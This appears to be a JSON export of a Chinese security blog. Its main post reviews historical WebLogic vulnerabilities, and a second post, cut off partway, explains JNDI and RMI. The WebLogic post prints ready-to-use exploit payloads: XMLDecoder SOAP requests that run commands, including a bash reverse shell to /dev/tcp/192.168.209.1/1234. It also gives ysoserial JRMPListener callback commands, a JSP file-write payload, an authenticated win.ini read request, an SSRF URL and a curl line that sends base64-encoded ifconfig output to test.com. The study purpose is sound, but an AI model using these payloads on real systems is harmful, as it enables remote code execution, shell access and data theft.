{"meta":{"title":"极客无影","subtitle":"——善守者藏于九地之下，善攻者动于九天之上，故能自保而全胜也。","description":" 90后无名小黑 | 北京工业大学","author":"FunctFan","url":"https://functfan.github.io","root":"/"},"pages":[{"title":"404","date":"2020-06-11T06:59:10.000Z","updated":"2020-06-11T06:59:25.260Z","comments":true,"path":"404.html","permalink":"https://functfan.github.io/404.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"about","date":"2020-06-11T06:50:21.000Z","updated":"2020-06-23T01:28:05.837Z","comments":true,"path":"about/index.html","permalink":"https://functfan.github.io/about/index.html","excerpt":"","text":"Internal monologue 我，要做自己。齐白石老先生曾说过：“学我者生，似我者死。”走不出前人的框架，自然也就不会有自己的天地。当流行泡沫小说时，我感觉那时在浪费时间，当流行网络游戏时，我感觉那是在虚度青春。要做自己，看清真实的我，拿出十二分的信心，告诉自己：“我就是我，凭什么跟他一样？！”。抛掉那些人为的浮华雕饰，亮出自己的王牌，追求自己的个性，做我自己，最好! whoami Name：90s Bleke Sex：不告诉你，以你的能力应该能猜的到~ Email：随时在变，花样百出 Free time：这个得好好想想，有空没空看自己心情了 Misc 七步成诗：我笑群儿较目前，当时拟弄掌中珠 。白云逸性都无定，一片彩霞仙洞中 。 热衷于：热衷于计算机安全技术的白帽子一枚，主要喜欢方向为java安全，0day漏洞挖掘，云安全 技术栈：云计算，大数据，人工智能，java，python，c/c++，mysql，sql server等半全栈； 兴趣爱好：中文台式9球，斯诺克，羽毛球，乒乓球，跑步，健身，读书； Rank：primary-bleke Mainly Research： 0day漏洞挖掘，云安全，大数据安全，CTF挑战GitHub：https://github.com/FunctFanPersonal Homepage：https://bleke.top/Gitbook: https://functfan.gitbook.io/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"categories","date":"2020-06-11T06:47:38.000Z","updated":"2020-06-11T06:49:38.356Z","comments":true,"path":"categories/index.html","permalink":"https://functfan.github.io/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"contact","date":"2020-06-11T06:50:52.000Z","updated":"2020-06-11T06:51:29.465Z","comments":true,"path":"contact/index.html","permalink":"https://functfan.github.io/contact/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friends","date":"2020-06-11T06:51:39.000Z","updated":"2020-06-11T06:51:56.450Z","comments":true,"path":"friends/index.html","permalink":"https://functfan.github.io/friends/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"search","date":"2020-06-12T07:27:54.000Z","updated":"2020-06-12T07:28:28.952Z","comments":true,"path":"search/index.html","permalink":"https://functfan.github.io/search/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-06-11T06:49:49.000Z","updated":"2020-06-11T06:50:09.626Z","comments":true,"path":"tags/index.html","permalink":"https://functfan.github.io/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"weblogic基础简介及系列漏洞调试总结","slug":"weblogic基础简介及系列漏洞调试总结","date":"2021-06-23T01:31:55.000Z","updated":"2021-06-23T09:06:30.050Z","comments":true,"path":"posts/1610177997/","link":"","permalink":"https://functfan.github.io/posts/1610177997/","excerpt":"","text":"前言weblogic是作为我入门 Java 安全第一个跟踪分析的框架及漏洞点，当写下这篇文章的时候我也是准备从零开始分析调试weblogic历史上全部的 RCE 漏洞。在整个过程中收获良多，为了确保对此系列漏洞的理解到位，不产生太离谱的偏差，一遍又一遍的 Debug，同时参考了网上无数的相关复现文章，消耗了大量的时间，在漏洞分析过程中，由于很多细节自己知识匮乏，也没有解释的太明白，在漏洞复现的时候也没有跟的太深，但是也没办法了，以我目前的能力只能做到这个程度了。 希望感兴趣的读者能够按照从前到后的顺序进行查看，否则可能有看不懂的情况，因为我在写的过程中也是跟随漏洞版本，利用已有的知识进行编制和测试的，所以会有一定的前置知识的需求。 部分内容引用自jjf012的文章，现注明出处！如有侵权，请联系我删除~ 作者：jjf012链接：https://www.jianshu.com/p/38033935a914来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 目录点击左边连接可以直接跳到对应漏洞的调试记录。 点击左边连接可以直接跳到对应漏洞的调试记录。 链接 描述 [攻击Java Web应用-[java web安全]](攻击Java Web应用 - [Java Web安全] (zhishihezi.net)) Java安全相关技术、IDEA调试技巧 weblogic简介及补丁分析方法(转) weblogic基础及补丁分析 weblogicT3协议及T3反序列化漏洞简介 weblogic RMI T3必须知道的知识 weblogic环境部署与远程调试 weblogic环境部署与远程调试 CVE-2015-4852-Weblogic反序列化漏洞复现与分析 CVE-2015-4852漏洞复现与分析 待补充其他 待补充其他 ### 历史漏洞整理 T3协议 什么是RMI：远程方法调用(Remote Method Invocation)。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。 Java远程消息交换协议 JRMP 即Java Remote MessagingProtocol，是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用RMI之下、TCP/IP之上的线路层协议。，也可以使用CORBA兼容的方法实现。详细介绍请参考：https://blog.csdn.net/cdl2008sky/article/details/6844719 T3协议是用于Weblogic服务器和其他Java Application之间传输信息的协议，是实现上述RMI远程过程调用的专有协议，其允许客户端进行JNDI调用。 当Weblogic发起一个T3协议连接的时候，Weblogic会连接每一个Java虚拟机并传输流量，由于通信过程得到了极大的简化，所以使得其在操作系统资源利用上实现的高效以及最大化，同时提高了传输速度。 CVE-2015-4852此漏洞主要是由于apache的标准库中Apache Commons Collections基础库的TransformedMap类中。根据@breenmachine的文章，他当时找漏洞的方法是，对weblogic在7001端口的T3 协议进行抓包，发现流量中有java反序列化之后Magic(幻数)ac ed 00 05，然后替换掉对应的部分。 利用方式等同下面的CVE-2016-3510，只不过payload不一样。 CVE-2016-0638此漏洞是基于CVE-2015-4852漏洞进行黑名单的绕过，CVE-2015-4852补丁主要应用在三个位置上： weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream weblogic.rjvm.MsgAbbrevInputStream.class weblogic.iiop.Utils.class 所以如果能找到可以在其readObject中创建自己的InputStream的对象，并且不是使用黑名单中的ServerChannelInputStream和MsgAbbrevInputStream的readExternal进行的反序列化，最后调用readObject()方法进行反序列化的数据的读取，这样就可以执行含有恶意代码的序列化代码。依据这个思路找到了weblogic.jms.common.StreamMessageImpl类，其中的readExternal()方法也符合攻击的需求。 利用方式等同下面的CVE-2016-3510，只不过payload不一样。 CVE-2016-3510此漏洞是与CVE-2016-0638漏洞利用方式相似，只是选择了weblogic.corba.utils.MarshalledObject进行绕过，绕过之前的CVE-2015-4852和CVE-2016-0638漏洞的修复补丁。 利用方式参照 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/WebLogic%20CVE-2016-3510.py CVE-2017-3248Apache Commons Collections基础的漏洞已经进行修补，所以CVE-2017-3248漏洞利用方法与之前三个漏洞不同，这次主要是利用了JRMP java远程方法协议。 利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，并使用UnicastRef和远端建立tcp连接，获取RMI registry，最终将加载的内容利用readObject()进行解析，导致之前序列化的恶意代码执行。 利用方式可以参照 https://github.com/quentinhardy/scriptsAndExploits 或者下面 CVE-2018-2628CVE-2018-2628漏洞与CVE-2017-3248漏洞利用方法类似，仅仅更换了使用的rmi接口，用java.rmi.activation.Activator替换了CVE-2017-3248所使用的java.rmi.registry.Registry，从而绕过resolveProxyClass的判断，成功绕过了CVE-2017-3248漏洞的修复补丁。 vulhub演示地址 1java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command] 其中，[command]即为想执行的命令，而[listen port]是JRMP Server监听的端口。 1python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient] [JRMPClient]：有JRMPClient或JRMPClient2两个选项，两者只有接口类名的差别。然后weblogic就会回连到攻击者JRMPListener ip，执行[command] CVE-2018-2893CVE-2018-2893漏洞绕过方式是利用StreamMessageImpl对ysoserial工具中的JRMPClient生成的payloadObject进行封装。相当于使用CVE-2016-0638的利用方式加上CVE-2017-3248的 payload 来绕过补丁。 利用方式可参考https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2628 CVE-2018-3191没看到具体介绍，只知道也是T3协议的锅。 这里下载payload生成，https://github.com/voidfyoo/CVE-2018-3191/releases weblogic-spring-jndi-12.2.1.3.jar for weblogic: 12.2.1.3 weblogic-spring-jndi-10.3.6.0.jar for weblogic: 10.3.6.0 12.2.1.0 12.1.3.0 12.2.1.1 先生成一个payload，触发weblogic回连。 1java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://攻击机ip:端口/exp &gt; payload 攻击者IP开启rmi服务 1java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 \"要执行的指令\" 然后用weblogic.py向weblogic发起请求 1python weblogic.py 172.20.0.2 7001 payload weblogic就会回连到攻击者IP，然后执行[command] CVE-2018-3197没找到介绍 CVE-2018-3201没找到介绍 CVE-2018-3245是补来补去一直没有修好的Weblogic JRMP反序列化漏洞。只要满足继承java.rmi.server.RemoteObject,且不在黑名单之中的类对象。 这里通过ReferenceWrapper_Stub这个类对象绕过。 POC生成可以参考 https://github.com/pyn3rd/CVE-2018-3245 利用方式等同 CVE-2018-3191 CVE-2019-2890CVE-2019-2890又又又绕过了Weblogic的反序列化黑名单，使攻击者可以通过T3协议对存在漏洞的Weblogic组件实施远程攻击，但该漏洞利用条件较高，官方也归类为需要身份认证。具体分析过程看 https://paper.seebug.org/1069/，文章的作者也给出了漏洞验证的方式：https://github.com/SukaraLin/CVE-2019-2890 标记重点：需要先获取服务器上的密钥文件SerializedSystemIni.dat来加密序列化后的字节流，而这个文件每台服务器都不一样。这就是这个漏洞鸡肋的地方。 HTTP协议CVE-2018-3252DeploymentService组件存在反序列化漏洞，需要登陆后才能使用。POC生成可以参考 https://github.com/b1ueb0y/CVE-2018-3252 CVE-2017-3506此漏洞主要是由于wls组件使用了webservice来处理soap请求，在weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法中，当localHeader1和localHeader2都不为null时，将会把&lt;work:WorkContext&gt;所包含的数据传入weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法，在此方法中，对WorkContextXmlInputAdapter类进行了实例化，并调用WorkContextXmlInputAdapter类的构造方法，通过XMLDecoder()进行反序列化操作。 可利用路径如下: 12345678/wls-wsat/CoordinatorPortType/wls-wsat/RegistrationPortTypeRPC/wls-wsat/ParticipantPortType/wls-wsat/RegistrationRequesterPortType/wls-wsat/CoordinatorPortType11/wls-wsat/RegistrationPortTypeRPC11/wls-wsat/ParticipantPortType11/wls-wsat/RegistrationRequesterPortType11 下面的POC等同于执行命令/bin/bash -c \"touch /tmp/123\" 12345678910111213141516171819202122&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"&gt; &lt;void class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"3\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=\"1\"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=\"2\"&gt; &lt;string&gt;touch /tmp/123&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\"/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; CVE-2017-10271 Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞CVE-2017-10271是对CVE-2017-3506修复补丁的一次绕过，可以看到唯一的变化就是把之前的Object标签变成了void标签。 bea_wls9_async_response _WL_internal/bea_wls_internal/9j4dqk/war/ uddiexplorer _WL_internal/wls-wast 访问http://your-ip:7001/bea_wls_internal/test.jsp 1234567891011121314151617181920POST /wls-wsat/CoordinatorPortType HTTP/1.1Content-Type: text/xml&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt; &lt;java&gt;&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.io.PrintWriter\"&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=\"println\"&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(\"test\"); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=\"close\"/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 除此之外，网上还出现了一些变形的payload，大家发现可以直接利用new和method元素完成payload的构造，连void元素都不用了，所以payload还可以这样写： 123456&lt;java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"&gt; &lt;new class=\"java.lang.ProcessBuilder\"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;method name=\"start\" /&gt; &lt;/new&gt;&lt;/java&gt; CVE-2019-2725 wls9-async 反序列化漏洞12345678910111213141516171819202122232425262728293031323334POST /_async/AsyncResponseService HTTP/1.1Host: 172.xxx:7001Content-Length: 789Accept-Encoding: gzip, deflateSOAPAction: Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml &lt;soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:asy='http://www.bea.com/async/AsyncResponseService'&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work='http://bea.com/2004/06/soap/workarea/'&gt; &lt;void class='java.lang.ProcessBuilder'&gt; &lt;array class='java.lang.String' length='3'&gt; &lt;void index='0'&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index='1'&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index='2'&gt; &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.209.1/1234 0&gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method='start' /&gt;&lt;/void&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 可以看到这回是利用class标签构造类，但是由于限制了method从而无法调用函数，因此，找了几个可以通过构造函数进行反序列化的类。网上通用的有 FileSystemXmlApplicationContext UnitOfWorkChangeSet 利用方式可参考 https://github.com/lufeirider/CVE-2019-2725 CVE-2019-2729 翻译，https://xz.aliyun.com/t/5496 这个漏洞是CVE-2019-2725的Bypass，对于JDK1.6，使用&lt;array method =\"forName\"&gt;标记有效地替换了&lt;class&gt;标记的功能。只需用&lt;array method =\"forName\"&gt;标签替换&lt;class&gt;标签就可以有效地绕过黑名单。 利用可以参考下面列出的漏洞检测脚本，改个命令即可。也可以参考这个，https://github.com/waffl3ss/CVE-2019-2729/blob/master/CVE-2019-2729.py https://www.freebuf.com/vuls/206374.html 根据近些年 weblogic 由于 XMLDecoder 导致的反序列漏洞的缝缝补补中，可以看到虽然绕过的 poc 层出不穷，但是利用的范围却越来越窄，从一开始的所有 jdk 通用，到 7u21 以下可以利用成功，再到最近的绕过已经只能在 1.6 利用成功，可以看到，保持jdk 版本的高版本可以有效的防范 java 反序列化攻击。与此同时，对于基本用不到的 weblogic 组件，还是能删就删为好。 XXEhttps://paper.seebug.org/906/ 可以利用XXE读取base_domain中的名为SerializedSystemIni.dat的密钥和config.xml密文，用weblogic_decrypt.jar解密weblogic的登陆密码。 11g的密文在 安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 密钥在安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat 10的密文在 安装目录/samples/domains/wl_server/security/boot.properties 任意文件上传(CVE-2018-2894)，需要登陆，参考： https://www.cnblogs.com/bmjoker/p/9825497.html https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894 任意文件上传CVE-2019-2618CVE-2019-2618漏洞主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。登录weblogic之后，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。另外，weblogic的DeploymentService接口的正常功能本来就能部署war包。 利用方式参考：https://github.com/jas502n/cve-2019-2618 任意文件读取CVE-2019-2615需要登陆后才能利用。 12345678910GET /bea_wls_management_internal2/wl_management HTTP/1.1Host: 127.0.0.1:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateusername:weblogicpassword:admin123456wl_request_type:wl_jsp_refresh_requestadminPath:c:\\windows\\win.ini CVE-2014-4210 SSRF1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7000 关于命令回显在linux中，被反引号包裹的字符串会被解释为命令行 12echo `whoami` testroot test windows下执行set可以看到一堆系统变量，用%号可以调用这些变量 12echo %COMPUTERNAME%你的计算机名 命令注入：利用管道符来注入要执行的命令 命令符(linux/win) 作用 ;/&amp; 多个命令顺序执行，无逻辑关系 &amp;&amp; 逻辑与，命令1正确执行后，才会执行命令2 ` 还有个|，如127.0.0.1|whoami，回显的是whoami的结果 利用Ping命令和dnslog结合获取回显结果 12C:\\Windows\\System32\\cmd.exe /c \"ping -n 3 test.com || ping -c 3 test.com\"/bin/bash -c \"ping -n 3 test.com || ping -c 3 test.com\" 目测每个目标要执行两次POC,另外linux还可以通过curl命令来回显 1curl test.com/`ifconfig|base64|tr '\\n' '-'` 漏洞检测只是检测是否存在漏洞，不是利用工具 https://github.com/rabbitmask/WeblogicScan https://github.com/0xn0ne/weblogicScanner.git 参考文章 https://www.4hou.com/vulnerable/12874.html https://icematcha.win/?p=1174 https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/ https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg weblogic反序列化漏洞分析与调试 https://blog.csdn.net/qq_27446553/article/details/78952010 https://github.com/bit4woo/code2sec.com/blob/master/weblogic%E6%BC%8F%E6%B4%9ECVE-2017-3506%E5%A4%8D%E7%8E%B0%EF%BC%9AWeb%20Services%E6%A8%A1%E5%9D%97%E7%9A%84%E6%BC%8F%E6%B4%9E.md document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"weblogic系列","slug":"weblogic系列","permalink":"https://functfan.github.io/categories/weblogic%E7%B3%BB%E5%88%97/"}],"tags":[{"name":"weblogic,基础知识,漏洞分析,调试,历史漏洞,系列总结","slug":"weblogic-基础知识-漏洞分析-调试-历史漏洞-系列总结","permalink":"https://functfan.github.io/tags/weblogic-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E8%B0%83%E8%AF%95-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E-%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"}]},{"title":"weblogicT3协议及T3反序列化漏洞简介","slug":"weblogicT3协议及T3反序列化漏洞简介","date":"2021-06-22T08:05:28.000Z","updated":"2021-06-23T01:25:43.655Z","comments":true,"path":"posts/914084023/","link":"","permalink":"https://functfan.github.io/posts/914084023/","excerpt":"","text":"版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。本文链接：https://nosec.org/home/detail/2859.html来源：奇安信本文版权归原作者所有，如有侵权请联系我及时删除 前言在研究WebLogic相关的漏洞的时候大家一定见过JNDI、RMI、JRMP、T3这些概念，简单的说，T3是WebLogic RMI调用时的通信协议，RMI又和JNDI有关系，JRMP是Java远程方法协议。我曾经很不清晰这些概念，甚至混淆。因此在我真正开始介绍T3协议及其反序列化漏洞之前，我会对这些概念进行一一介绍。 JNDIJNDI(Java Naming and Directory Interface)是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。 Naming Service 命名服务： 命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。 Directory Service 目录服务： 目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。 Reference 引用： 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。 看一下常见的JNDI的例子： 1jdbc://&lt;domain&gt;:&lt;port&gt;rmi://&lt;domain&gt;:&lt;port&gt;ldap://&lt;domain&gt;:&lt;port&gt; JNDI的查找一般使用lookup()方法如registry.lookup(name)。 RMIRMI(Remote Method Invocation)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。 Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点，后面会详细说。 举例说明： 假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。 这种设计和实现很像当今流行的Web API，只不过RMI只支持Java原生调用，程序员在写代码的时候和调用本地方法并无太大差别，也不用关心数据格式的转换和网络上的传输。类似的做法在ASP.NET中也有同样的实现叫WebServices。 RMI远程方法调用通常由以下几个部分组成： 客户端对象 服务端对象 客户端代理对象（stub） 服务端代理对象（skeleton） 下面来看一下最简单的Java RMI要如何实现： 首先创建服务端对象类，先创建一个接口继承java.rmi.Remote: 123456// IHello.javaimport java.rmi.*;public interface IHello extends Remote { public String sayHello() throws RemoteException;} 然后创建服务端对象类，实现这个接口： 1234567// Hello.javapublic class Hello implements IHello{ public Hello() {} public String sayHello() { return \"Hello, world!\"; }} 创建服务端远程对象骨架并绑定在JNDI Registry上： 123456789101112131415161718192021222324// Server.javaimport java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class Server{ public Server() throws RemoteException{} public static void main(String args[]) { try { // 实例化服务端远程对象 Hello obj = new Hello(); // 创建服务端远程对象的骨架（skeleton） IHello skeleton = (IHello) UnicastRemoteObject.exportObject(obj, 0); // 将服务端远程对象的骨架绑定到Registry上 Registry registry = LocateRegistry.getRegistry(); registry.bind(\"Hello\", skeleton); System.err.println(\"Server ready\"); } catch (Exception e) { System.err.println(\"Server exception: \" + e.toString()); e.printStackTrace(); } }} RMI的服务端已经构建完成，继续关注客户端： 123456789101112131415161718192021// Client.javaimport java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Client { private Client() {} public static void main(String[] args) { String host = (args.length &lt; 1) ? \"127.0.0.1\" : args[0]; try { Registry registry = LocateRegistry.getRegistry(host); // 创建客户端对象stub（存根） IHello stub = (IHello) registry.lookup(\"Hello\"); // 使用存根调用服务端对象中的方法 String response = stub.sayHello(); System.out.println(\"response: \" + response); } catch (Exception e) { System.err.println(\"Client exception: \" + e.toString()); e.printStackTrace(); } }} 至此，简单的RMI服务和客户端已经构建完成，我们来看一下执行效果： 1234567$ rmiregistry &amp;[1] 80849$ java Server &amp;[2] 80935Server ready$ java Clientresponse: Hello, world! 简单解释一下RMI的整个调用流程： 客户端通过客户端的Stub对象欲调用远程主机对象上的方法 Stub代理客户端处理远程对象调用请求，并且序列化调用请求后发送网络传输 服务端远程调用Skeleton对象收到客户端发来的请求，代理服务端反序列化请求，传给服务端 服务端接收到请求，方法在服务端执行然后将返回的结果对象传给Skeleton对象 Skeleton接收到结果对象，代理服务端将结果序列化，发送给客户端 客户端Stub对象拿到结果对象，代理客户端反序列化结果对象传给客户端 WebLogic RMIWebLogic RMI和T3反序列化漏洞有很大关系，因为T3就是WebLogic RMI所使用的协议。网上关于漏洞的PoC很多，但是我们通过那些PoC只能看到它不正常（漏洞触发）的样子，却很少能看到它正常工作的样子。那么我们就从WebLogic RMI入手，一起看看它应该是什么样的。 WebLogic RMI就是WebLogic对Java RMI的实现，它和我刚才讲过的Java RMI大体一致，在功能和实现方式上稍有不同。我们来细数一下WebLogic RMI和Java RMI的不同之处。 WebLogic RMI支持集群部署和负载均衡因为WebLogic本身就是为分布式系统设计的，因此WebLogic RMI支持集群部署和负载均衡也不难理解了。 WebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象WebLogic的字节码生成功能会自动生成服务端的字节码到内存。不再生成Skeleton骨架对象，也不需要使用UnicastRemoteobject对象。 WebLogic RMI客户端使用动态代理在WebLogic RMI 客户端中，字节码生成功能会自动为客户端生成代理对象，因此Stub也不再需要。 WebLogic RMI主要使用T3协议（还有基于CORBA的IIOP协议）进行客户端到服务端的数据传输 T3传输协议是WebLogic的自有协议，它有如下特点： 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。下面我再简单的实现一下WebLogic RMI，实现依据Oracle的WebLogic 12.2.1的官方文档，但是官方文档有诸多错误，所以我下面的实现和官方文档不尽相同但保证可以运行起来。 首先依然是创建服务端对象类，先创建一个接口继承java.rmi.Remote: 12345678// IHello.javapackage examples.rmi.hello;import java.rmi.RemoteException;public interface IHello extends java.rmi.Remote { String sayHello() throws RemoteException;} 创建服务端对象类，实现这个接口： 1234567// HelloImpl.javapublic class HelloImpl implements IHello { public String sayHello() { return \"Hello Remote World!!\"; }} 创建服务端远程对象，此时已不需要Skeleton对象和UnicastRemoteobject对象： 